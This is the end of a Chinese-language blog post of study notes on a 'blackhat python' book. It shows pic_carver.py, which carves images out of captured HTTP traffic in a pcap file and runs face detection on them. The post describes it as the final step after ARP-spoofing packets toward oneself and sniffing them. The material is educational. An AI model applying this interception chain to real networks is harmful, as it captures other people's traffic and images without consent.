</span></span><span class=line><span class=cl><span class=n>pcap_file</span> <span class=o>=</span> <span class=s2>&#34;bhp.pcap&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>face_detect</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>file_name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cascade</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>CascadeClassifier</span><span class=p>(</span><span class=s2>&#34;haarcascade_frontalface_alt.xml&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rects</span> <span class=o>=</span> <span class=n>cascade</span><span class=o>.</span><span class=n>detectMultiScale</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=mf>1.3</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                     <span class=n>cv2</span><span class=o>.</span><span class=n>CASCADE_SCALE_IMAGE</span><span class=p>,</span> <span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                     <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>rects</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>rects</span><span class=p>[:,</span> <span class=mi>2</span><span class=p>:]</span> <span class=o>+=</span> <span class=n>rects</span><span class=p>[:,</span> <span class=p>:</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># highlight the faces in the image</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span><span class=p>,</span> <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span> <span class=ow>in</span> <span class=n>rects</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cv2</span><span class=o>.</span><span class=n>rectangle</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=p>(</span><span class=n>x1</span><span class=p>,</span> <span class=n>y1</span><span class=p>),</span> <span class=p>(</span><span class=n>x2</span><span class=p>,</span> <span class=n>y2</span><span class=p>),</span> <span class=p>(</span><span class=mi>127</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>0</span><span class=p>),</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cv2</span><span class=o>.</span><span class=n>imwrite</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>-</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>faces_directory</span><span class=p>,</span> <span class=n>pcap_file</span><span class=p>,</span> <span class=n>file_name</span><span class=p>),</span> <span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_http_headers</span><span class=p>(</span><span class=n>http_payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># split the headers off if it is HTTP traffic</span>
</span></span><span class=line><span class=cl>        <span class=n>headers_raw</span> <span class=o>=</span> <span class=n>http_payload</span><span class=p>[:</span><span class=n>http_payload</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=c1># break out the headers</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;(?P&lt;name&gt;.*?): (?P&lt;value&gt;.*?)\r\n&#34;</span><span class=p>,</span> <span class=n>headers_raw</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;Content-Type&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>headers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>headers</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_image</span><span class=p>(</span><span class=n>headers</span><span class=p>,</span> <span class=n>http_payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>image</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>image_type</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;image&#34;</span> <span class=ow>in</span> <span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=c1># grab the image type and image body</span>
</span></span><span class=line><span class=cl>            <span class=n>image_type</span> <span class=o>=</span> <span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>image</span> <span class=o>=</span> <span class=n>http_payload</span><span class=p>[</span><span class=n>http_payload</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>            <span class=c1># if we detect compression decompress the image</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;Content-Encoding&#34;</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>(</span><span class=n>headers</span><span class=o>.</span><span class=n>keys</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Encoding&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;gzip&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>image</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>image</span><span class=p>,</span> <span class=mi>16</span> <span class=o>+</span> <span class=n>zlib</span><span class=o>.</span><span class=n>MAX_WBITS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>elif</span> <span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Encoding&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;deflate&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>image</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>image</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>image</span><span class=p>,</span> <span class=n>image_type</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>http_assembler</span><span class=p>(</span><span class=n>pcap_fl</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>carved_images</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>faces_detected</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>rdpcap</span><span class=p>(</span><span class=n>pcap_fl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sessions</span> <span class=o>=</span> <span class=n>a</span><span class=o>.</span><span class=n>sessions</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>session</span> <span class=ow>in</span> <span class=n>sessions</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>http_payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>sessions</span><span class=p>[</span><span class=n>session</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>packet</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>dport</span> <span class=o>==</span> <span class=mi>80</span> <span class=ow>or</span> <span class=n>packet</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>sport</span> <span class=o>==</span> <span class=mi>80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=c1># reassemble the stream into a single buffer</span>
</span></span><span class=line><span class=cl>                    <span class=n>http_payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>packet</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span> <span class=o>=</span> <span class=n>get_http_headers</span><span class=p>(</span><span class=n>http_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>headers</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>image</span><span class=p>,</span> <span class=n>image_type</span> <span class=o>=</span> <span class=n>extract_image</span><span class=p>(</span><span class=n>headers</span><span class=p>,</span> <span class=n>http_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>image</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>image_type</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># store the image</span>
</span></span><span class=line><span class=cl>            <span class=n>file_name</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2>-pic_carver_</span><span class=si>%d</span><span class=s2>.</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>pcap_fl</span><span class=p>,</span> <span class=n>carved_images</span><span class=p>,</span> <span class=n>image_type</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>pictures_directory</span><span class=p>,</span> <span class=n>file_name</span><span class=p>),</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>fd</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>image</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>carved_images</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=c1># now attempt face detection</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span> <span class=o>=</span> <span class=n>face_detect</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>pictures_directory</span><span class=p>,</span> <span class=n>file_name</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                                     <span class=n>file_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>result</span> <span class=ow>is</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>faces_detected</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>carved_images</span><span class=p>,</span> <span class=n>faces_detected</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>carved_img</span><span class=p>,</span> <span class=n>faces_dtct</span> <span class=o>=</span> <span class=n>http_assembler</span><span class=p>(</span><span class=n>pcap_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Extracted: </span><span class=si>%d</span><span class=s2> images&#34;</span> <span class=o>%</span> <span class=n>carved_images</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Detected: </span><span class=si>%d</span><span class=s2> faces&#34;</span> <span class=o>%</span> <span class=n>faces_detected</span><span class=p>)</span>
</span></span></code></pre></div><p>整個流程是</p><ol><li>把封包導向自己 (arper.py)</li><li>sniff出需要的封包，存成pcap (mail_sniffer.py，雖然沒有存成pcap的部分)</li><li>對pcap做分析(pic_carver.py)</li></ol></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://littlebees.github.io/2020/09/blackhat-python-web/><span class=title>« Prev</span><br><span>blackhat python - web</span>
</a><a class=next href=https://littlebees.github.io/2020/08/nginx%E7%9A%84%E7%B0%A1%E5%96%AEsurvey/><span class=title>Next »</span><br><span>nginx的簡單survey</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://littlebees.github.io/>記事本</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>